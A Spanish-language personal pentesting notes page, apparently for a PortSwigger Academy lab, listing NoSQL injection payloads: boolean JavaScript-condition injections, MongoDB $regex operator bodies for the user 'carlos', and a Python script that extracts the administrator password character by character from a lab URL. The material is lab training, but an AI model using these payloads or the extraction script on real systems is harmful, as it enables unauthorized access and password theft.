<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>M0B notes</title>
  <meta name="description" content="&lt;p&gt;Responde a booleans :&lt;/p&gt;">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="icon" href="/M0B.png" type="image/png">
  <style>
    /* fallback si la hoja no carga */
    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
  </style>
  
  <script defer src="/assets/js/copy-code.js"></script>
</head>
<body>
  <header class="site-header">
    <div class="site-brand">
      <img class="brand-logo" src="/M0B.png" alt="logo" />
      <div class="brand-title">M0B notes</div>
    </div>
    <nav class="site-nav">
      <a href="/">Inicio</a>
      <a href="/puertos/">Puertos</a>
      <a href="/escalada/">Escalada</a>
      <a href="/portswigger/">Portswigger</a>
      <a href="/hackthebox/">HackTheBox</a>
      <a href="/real_life/">Real Life</a>
      <a href="/extras/">Extras</a>
    </nav>
  </header>

  <main>
    <div class="container">
      <p>Responde a booleans :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>administrator'+%26%26+1+%26%26+'x
</code></pre></div></div>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' &amp;&amp; this.password[0] == '</span><span class="n">a</span><span class="s1">' || '</span><span class="n">a</span><span class="s1">'=='</span><span class="n">b</span>
<span class="s1">' &amp;&amp; this.password.match(/</span><span class="se">\d</span><span class="s1">/) || '</span><span class="n">a</span><span class="s1">'=='</span><span class="n">b</span> <span class="o">//</span><span class="n">La</span> <span class="n">pass</span> <span class="n">tiene</span> <span class="n">n</span><span class="err">ú</span><span class="n">meros</span>
<span class="s1">' &amp;&amp; this.password.match(/[a-z]/) || '</span><span class="n">a</span><span class="s1">'=='</span><span class="n">b</span> <span class="o">//</span><span class="n">La</span> <span class="n">pass</span> <span class="n">tiene</span> <span class="k">min</span><span class="err">ú</span><span class="n">sculas</span>
</code></pre></div></div>

<p>La pass tiene números</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"$regex"</span><span class="p">:</span><span class="w"> </span><span class="s2">".*</span><span class="se">\\</span><span class="s2">d.*"</span><span class="w"> 
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Tiene minúsculas</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"$regex"</span><span class="p">:</span><span class="w"> </span><span class="s2">".*[a-z].*"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Ir iterando sobre la contraseña :</p>
<pre><code class="language-HTTP">GET /user/lookup?user=wiener' &amp;&amp; this.password[0] == 'a' || 'a'=='b
</code></pre>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">urllib3</span><span class="p">,</span><span class="n">string</span>
<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>

<span class="k">def</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">)</span>

<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">Cookie</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">session=Ja7NDzdq3qDkdLa1fmYN9SwjSFHVLJoS</span><span class="sh">"</span><span class="p">}</span>

<span class="c1">#Variables Globales
</span><span class="n">characters</span><span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">'</span><span class="s">_</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">makeSQLI</span><span class="p">():</span>
	<span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>
	<span class="n">s</span><span class="p">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
    

	<span class="n">p1</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Fuerza Bruta</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="sh">"</span><span class="s">Iniciando proceso de fuerza bruta</span><span class="sh">"</span><span class="p">)</span>

	<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

	<span class="n">p2</span><span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Password</span><span class="sh">"</span><span class="p">)</span>

	<span class="n">password</span><span class="o">=</span> <span class="sh">""</span>
	<span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span> <span class="c1">#Rango 1 - (tamaño database + 1)
</span>		<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
			<span class="n">payload</span><span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">administrator</span><span class="sh">'</span><span class="s">+%26%26+this.password[</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">]+%3d%3d+</span><span class="sh">'</span><span class="si">{</span><span class="n">character</span><span class="si">}</span><span class="sh">'</span><span class="s">+||+</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="s">%3d%3d</span><span class="sh">'</span><span class="s">b</span><span class="sh">"</span>
			<span class="n">url</span><span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">https://0add009203f6b951805d30b700b8009d.web-security-academy.net/user/lookup?user=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="sh">"</span>
			<span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
			<span class="c1">#url = quote(url, safe=':/?&amp;=.,')
</span>			<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
			<span class="k">if</span> <span class="sh">"</span><span class="s">role</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span> <span class="p">:</span>
				<span class="n">password</span> <span class="o">+=</span> <span class="n">character</span>
				<span class="n">p2</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
				<span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
	<span class="nf">makeSQLI</span><span class="p">()</span>
</code></pre></div></div>


      <div class="footer">
        <span class="muted">© 2025 · Generado con Jekyll</span>
      </div>
    </div>
  </main>
</body>
</html>

